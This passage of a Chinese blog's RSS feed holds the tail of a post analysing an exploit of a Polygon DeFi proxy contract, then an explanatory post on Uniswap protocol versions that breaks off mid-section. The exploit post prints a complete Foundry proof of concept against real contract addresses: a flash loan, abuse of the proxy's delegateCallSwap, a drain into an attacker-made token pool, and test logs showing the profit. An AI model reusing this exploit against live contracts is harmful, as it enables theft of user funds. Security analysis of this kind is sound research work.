所以他使用了闪电贷来支付购买Leverage Token的成本&lt;code&gt;X&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;攻击流程&#34;&gt;&lt;span&gt;攻击流程&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;到这里查看攻击流程 : &lt;a href=&#34;https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;我总结了一下, 如下图, 每一行开头的数字对应攻击流程图中的行号&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://github.com/yinhui1984/imagehosting/blob/main/images/1678870443464770000.png?raw=true&#39; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;POC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;import &amp;#34;lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&amp;#34;;&#xA;import &amp;#34;lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&amp;#34;;&#xA;import &amp;#34;lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&amp;#34;;&#xA;&#xA;interface phxProxy {&#xA;    function buyLeverage(&#xA;        uint256 amount,&#xA;        uint256 minAmount,&#xA;        uint256 deadLine,&#xA;        bytes calldata&#xA;    ) external;&#xA;&#xA;    function delegateCallSwap(bytes memory data) external;&#xA;}&#xA;&#xA;interface DPPAdvanced {&#xA;    function flashLoan(&#xA;        uint256 baseAmount,&#xA;        uint256 quoteAmount,&#xA;        address assetTo,&#xA;        bytes calldata&#xA;    ) external;&#xA;}&#xA;&#xA;//https://polygonscan.com/address/0x65baf1dc6fa0c7e459a36e2e310836b396d1b1de#code&#xA;phxProxy constant PHX_PROXY = phxProxy(&#xA;    0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de&#xA;);&#xA;&#xA;IUniswapV2Router02 constant QuickSwapRouter = IUniswapV2Router02(&#xA;    0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff&#xA;);&#xA;&#xA;DPPAdvanced constant DPP = DPPAdvanced(&#xA;    0x1093ceD81987Bf532c2b7907B2A8525cd0C17295&#xA;);&#xA;&#xA;IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);&#xA;IERC20 constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);&#xA;&#xA;// 我们自己的垃圾币&#xA;contract ExampleToken is ERC20 {&#xA;    constructor() ERC20(&amp;#34;Example&amp;#34;, &amp;#34;EXM&amp;#34;) {&#xA;        _mint(msg.sender, 1_500_000 * 1e18);&#xA;    }&#xA;}&#xA;&#xA;contract HackTest is Test {&#xA;    ExampleToken myToken;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;polygon&amp;#34;, 40066946);&#xA;        myToken = new ExampleToken();&#xA;        deal(address(WETH), address(this), 1 ether);&#xA;        vm.label(address(PHX_PROXY), &amp;#34;PHX_PROXY&amp;#34;);&#xA;        vm.label(address(QuickSwapRouter), &amp;#34;QuickSwapRouter&amp;#34;);&#xA;        vm.label(address(DPP), &amp;#34;DPP&amp;#34;);&#xA;        vm.label(address(USDC), &amp;#34;USDC&amp;#34;);&#xA;        vm.label(address(WETH), &amp;#34;WETH&amp;#34;);&#xA;        vm.label(&#xA;            0x6d68bEB09ea7e76d561EA8C4Aac34A6611dd9821,&#xA;            &amp;#34;LogicContractOfProxy&amp;#34;&#xA;        );&#xA;        vm.label(0x0a6293a64D4C2EaaB8e349FA6A9F4D238d46b491, &amp;#34;polygonOracle&amp;#34;);&#xA;        vm.label(&#xA;            0xd0289082cf4c5c2ba448B4B9c67232729aa75EfA,&#xA;            &amp;#34;coinInfo.stakePool&amp;#34;&#xA;        );&#xA;        vm.label(&#xA;            0x1021024d6Dc53BCb929eA0e6A664194809C9464a,&#xA;            &amp;#34;Logic of coinInfo.stakePool&amp;#34;&#xA;        );&#xA;    }&#xA;&#xA;    function testHack() public {&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Attacker USDC balance before exploit:&amp;#34;,&#xA;            USDC.balanceOf(address(this)),&#xA;            6&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Attacker WETH balance before exploit:&amp;#34;,&#xA;            WETH.balanceOf(address(this)),&#xA;            18&#xA;        );&#xA;&#xA;        // 1. 构建垃圾币交易池， 方便代理合约过来置换~~&#xA;        myToken.approve(address(QuickSwapRouter), type(uint256).max);&#xA;        WETH.approve(address(QuickSwapRouter), type(uint256).max);&#xA;&#xA;        QuickSwapRouter.addLiquidity(&#xA;            address(myToken),&#xA;            address(WETH),&#xA;            7 * 1e15,&#xA;            7 * 1e15,&#xA;            0,&#xA;            0,&#xA;            address(this),&#xA;            block.timestamp&#xA;        );&#xA;&#xA;        // 2. 使用闪电贷，贷款以向代理合约购买Leverage Token&#xA;        // https://dodoex.github.io/docs/docs/flashSwap&#xA;        DPP.flashLoan(0, 7990000000, address(this), new bytes(1));&#xA;    }&#xA;&#xA;    function DPPFlashLoanCall(&#xA;        address,&#xA;        uint256,&#xA;        uint256,&#xA;        bytes calldata&#xA;    ) external {&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: &amp;#34;,&#xA;            WETH.balanceOf(address(PHX_PROXY)),&#xA;            18&#xA;        );&#xA;        // 3, 向代理合约购买Leverage Token, make the proxy contract rich~&#xA;        USDC.approve(address(PHX_PROXY), type(uint256).max);&#xA;        PHX_PROXY.buyLeverage(7990000000, 0, block.timestamp, new bytes(0));&#xA;        uint256 swapAmount = WETH.balanceOf(address(PHX_PROXY));&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: &amp;#34;,&#xA;            WETH.balanceOf(address(PHX_PROXY)),&#xA;            18&#xA;        );&#xA;&#xA;        //4. 让代理合约用它的WETH来置换我们的垃圾币&#xA;        // 然后代理合约的WETH转移到我们垃圾币交易池中&#xA;        bytes memory swapData = abi.encodeWithSelector(&#xA;            0xa9678a18, //swap&#xA;            address(QuickSwapRouter),&#xA;            address(WETH),&#xA;            address(myToken),&#xA;            swapAmount&#xA;        );&#xA;        PHX_PROXY.delegateCallSwap(swapData);&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;WETH.balanceOf(address(PHX_PROXY)) after exploit: &amp;#34;,&#xA;            WETH.balanceOf(address(PHX_PROXY)),&#xA;            18&#xA;        );&#xA;&#xA;        // 5. 这里写成2步更容易理解&#xA;        // 5.1 我们用另外一堆垃圾币向我们创建的交易池（mytoken &amp;lt;=&amp;gt; WETH）进行置换，将它收到的代理合约给的WETH置换出来&#xA;        // 5.2 然后我们将得到的WETH又到其他的交易池（WETH &amp;lt;=&amp;gt; USDC）进行置换，以套现&#xA;        address[] memory path = new address[](3);&#xA;        path[0] = address(myToken);&#xA;        path[1] = address(WETH);&#xA;        path[2] = address(USDC);&#xA;        uint[] memory amounts = QuickSwapRouter.swapExactTokensForTokens(&#xA;            1000000000000000000000000,&#xA;            0,&#xA;            path,&#xA;            address(this),&#xA;            block.timestamp&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&amp;#34;swap amounts[0]&amp;#34;, amounts[0], 18);&#xA;        emit log_named_decimal_uint(&amp;#34;swap amounts[1]&amp;#34;, amounts[1], 18);&#xA;        emit log_named_decimal_uint(&amp;#34;swap amounts[2]&amp;#34;, amounts[2], 6);&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Attacker USDC balance after exploit:&amp;#34;,&#xA;            USDC.balanceOf(address(this)),&#xA;            6&#xA;        );&#xA;&#xA;        //归还贷款 (DODO Flash Loan 不要手续费 )&#xA;        USDC.transfer(address(DPP), 7990000000);&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Attacker USDC balance after return FlashLoan:&amp;#34;,&#xA;            USDC.balanceOf(address(this)),&#xA;            6&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;Attacker WETH balance after exploit:&amp;#34;,&#xA;            WETH.balanceOf(address(this)),&#xA;            18&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;~ ❯ forge test --match-contract HackTest  -vv         &#xA;[⠔] Compiling...&#xA;[⠑] Compiling 1 files with 0.8.17&#xA;[⠘] Solc 0.8.17 finished in 2.16s&#xA;Compiler run successful&#xA;&#xA;Running 1 test for test/hack.t.sol:HackTest&#xA;[PASS] testHack() (gas: 3381824)&#xA;Logs:&#xA;  Attacker USDC balance before exploit:: 0.000000&#xA;  Attacker WETH balance before exploit:: 1.000000000000000000&#xA;  WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: : 0.000000000423128453&#xA;  WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: : 11.407989927123285963&#xA;  WETH.balanceOf(address(PHX_PROXY)) after exploit: : 0.000000000000000000&#xA;  swap amounts[0]: 1000000.000000000000000000&#xA;  swap amounts[1]: 11.414989927073990725&#xA;  swap amounts[2]: 18108.937231&#xA;  Attacker USDC balance after exploit:: 18108.937231&#xA;  Attacker USDC balance after return FlashLoan:: 10118.937231&#xA;  Attacker WETH balance after exploit:: 0.993000000000000000&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Uniswap</title>
      <link>https://yinhui1984.github.io/uniswap/</link>
      <pubDate>Mon, 13 Mar 2023 09:53:56 +0800</pubDate>
      <guid>https://yinhui1984.github.io/uniswap/</guid>
      <category domain="https://yinhui1984.github.io/categories/blockchain/">Blockchain</category>
      <description>&lt;p&gt;uniswap API 解释与举例&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;名词解释&#34;&gt;&lt;span&gt;名词解释&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%90%8d%e8%af%8d%e8%a7%a3%e9%87%8a&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Uniswap lab: 开发Uniswap协议的公司，同时也开发了网络界面。&lt;/li&gt;&#xA;&lt;li&gt;Uniswap Protocol: 一套持久的、&lt;strong&gt;不可升级&lt;/strong&gt;的智能合约，共同创建了一个自动做市商，该协议促进了以太坊区块链上ERC-20代币的点对点做市和交换。&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://app.uniswap.org/#/swap&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Uniswap Interface:&lt;/a&gt; 一个网络界面，允许与Uniswap协议轻松互动。该界面只是人们与Uniswap协议互动的众多方式之一。&lt;/li&gt;&#xA;&lt;li&gt;Uniswap Governance: 用于管理Uniswap协议的治理系统，由UNI代币启用。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;fee-on-transfer-tokens&#34;&gt;&lt;span&gt;Fee-On-Transfer Tokens&lt;/span&gt;&#xA;  &lt;a href=&#34;#fee-on-transfer-tokens&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;手续费转移代币（Fee-On-Transfer Tokens）是一种特殊类型的代币，其主要特点是在代币转移的同时，会从转移金额中抽取一定比例的代币作为手续费，并将这部分代币转移给代币的持有者或其他地址。&lt;/p&gt;&#xA;&lt;p&gt;这种代币主要用于在代币交易过程中收取手续费，而不需要代币交易双方自行支付手续费。通常，这种代币的手续费率是在交易发生时动态计算的，通常以固定比例或动态算法的形式进行计算。手续费可以用于维护代币的生态系统，支持开发者、社区等。&lt;/p&gt;&#xA;&lt;p&gt;在 Uniswap 中，如果一个代币是 Fee-On-Transfer Tokens，那么在将其从流动性池中移除时，需要根据代币在池子中的比例计算手续费，并将其转移到 Uniswap 协议的费用池中。这样，就可以避免在代币交易时需要交纳手续费的麻烦，使得代币交易更加方便快捷。&lt;/p&gt;&#xA;&lt;p&gt;一些实际存在的 Fee-On-Transfer Tokens 包括：Safemoon、Reflect.finance、Moonrat、ElonGate等。&lt;/p&gt;&#xA;&lt;p&gt;以 Safemoon 为例，Safemoon 是一种基于 Binance Smart Chain 的 Fee-On-Transfer Tokens，其交易手续费为 10%，其中 5% 作为交易流动性提供者的奖励，5% 作为持有者的奖励。当持有者在交易时出售 Safemoon 代币时，交易中的 10% 会被抽取为手续费，其中 5% 会自动流向交易对的流动性池子，另外 5% 会按比例分配给 Safemoon 的所有持有者。&lt;/p&gt;&#xA;&lt;p&gt;Reflect.finance 是另一个 Fee-On-Transfer Tokens，它的交易手续费是 2%。在交易时，2% 的代币会被抽取为手续费，其中 1% 将会自动流向交易对的流动性池，另外 1% 会按比例分配给所有的持有者。&lt;/p&gt;&#xA;&lt;p&gt;这些代币的特点是：在代币转移的过程中，一定比例的代币会被抽取为手续费，并按照一定的规则进行分配。这种设计可以激励代币持有者长期持有代币，并有助于代币的价格稳定性。&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;uniswap-协议&#34;&gt;&lt;span&gt;uniswap 协议&lt;/span&gt;&#xA;  &lt;a href=&#34;#uniswap-%e5%8d%8f%e8%ae%ae&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/concepts/uniswap-protocol&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/concepts/uniswap-protocol&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Uniswap协议是一个点对点系统，旨在交换以太坊区块链上的加密货币（ERC-20代币）。该协议被实现为一套持久的、不可升级的智能合约；旨在优先考虑抗审查、安全、自我监护，并在没有任何可信任的中介机构可能选择性地限制访问的情况下运作。&lt;/p&gt;&#xA;&lt;p&gt;uniswap使用自动做市商（AMM, Auto Market Making），有时被称为恒定功能做市商，来代替订单簿(order book)。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;AMM用两种资产的流动性池取代了订单簿市场上的买卖订单，这两种资产都是相对于对方的价值。当一种资产被交易为另一种资产时，两种资产的相对价格就会发生变化，两种资产的新市场价格就会确定&lt;/strong&gt;。在这种动态中，买方或卖方直接与资金池进行交易，而不是与其他各方留下的具体订单进行交易。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;uniswap-v1&#34;&gt;&lt;span&gt;uniswap V1&lt;/span&gt;&#xA;  &lt;a href=&#34;#uniswap-v1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;交易是针对智能合约或流动性池的，一个数学公式决定了资产的价格。流动性提供者向帮助做市的池子增加流动性。&lt;/p&gt;&#xA;&lt;p&gt;在Uniswap流动性池中，交易资产对的比例应该是恒定的。其数学表达式为&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;X * Y = K&#xA;&#xA;X :第一种资产的储备&#xA;&#xA;Y : 第二中资产的储备&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;流动性提供者应以K的方式增加流动性，使其不发生变化。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://miro.medium.com/max/1050/1*CLjUpP1efeDdXeU-dJRBJw.png&#39; alt=&#34;https://miro.medium.com/max/1050/1*CLjUpP1efeDdXeU-dJRBJw.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Uniswap v1只支持ETH-ERC 20对的互换。如果用户希望将USDC换成DAI，第一步是将USDC换成ETH，然后兑换ETH-DAI，得到DAI。Uniswap v1还促进了LP代币的概念。当流动性提供者（LPs）向任何池子增加流动性时，他们会收到代表增加的流动性的LP代币。然后，这些LP代币可以被押注或燃烧，以赎回奖励。为了奖励流动性提供者，会产生0.3%的交易费。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;uniswap-v2&#34;&gt;&lt;span&gt;uniswap V2&lt;/span&gt;&#xA;  &lt;a href=&#34;#uniswap-v2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Uniswap v1的主要缺点是 &amp;ldquo;ETH桥接 &amp;ldquo;问题，即缺乏ERC20-ERC20代币池。这导致了当用户想要交换一个ERC20代币时，成本上升和高滑点(high slippage)&lt;/p&gt;&#xA;&lt;p&gt;Uniswap v2在用户界面和体验上比v1好得多。同时，它通过引入ERC20-ERC20池的概念，消除了ETH桥接的问题。另一个重要的区别是在核心合约中使用wrapped ETH，而不是原生ETH。然而，交易者可以通过辅助合约使用ETH。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://miro.medium.com/max/1050/1*HeCiFcK_4LjKmK14Iy37BQ.png&#39; alt=&#34;https://miro.medium.com/max/1050/1*HeCiFcK_4LjKmK14Iy37BQ.png&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Uniswap v2的闪电互换(&lt;code&gt;FlashSwap&lt;/code&gt;)概念允许用户提取任何数量的ERC20代币，而不需要预先付款。但他们可以为提取的代币付款，或支付一部分并归还其余部分，或归还所有提取的代币。这些事情可以在交易执行结束时进行。&lt;/p&gt;&#xA;&lt;p&gt;Uniswap v2还引入了协议费。社区治理在开启/关闭这项费用方面起着至关重要的作用。0.3%的交易费中的0.05%的协议费将被保留给塑造网络路线图的Uniswap平台的发展。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;uniswarp-v3&#34;&gt;&lt;span&gt;uniswarp V3&lt;/span&gt;&#xA;  &lt;a href=&#34;#uniswarp-v3&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Uniswap v3旨在超越基于稳定币的AMM和集中式交易所，提供更好的资本效率和准确性，更灵活的收费结构，以及流动性提供者根据自己的喜好建立独特的价格曲线的能力。Uniswap v3还允许LPs在自定义的价格范围内集中他们的资本，增强所需价格的流动性，并在市场超出LP指定的价格范围时自动从池中移除流动性。Uniswap v3的收费结构是由社区管理的，包括三个不同的收费等级。&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;v2合约&#34;&gt;&lt;span&gt;V2合约&lt;/span&gt;&#xA;  &lt;a href=&#34;#v2%e5%90%88%e7%ba%a6&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; 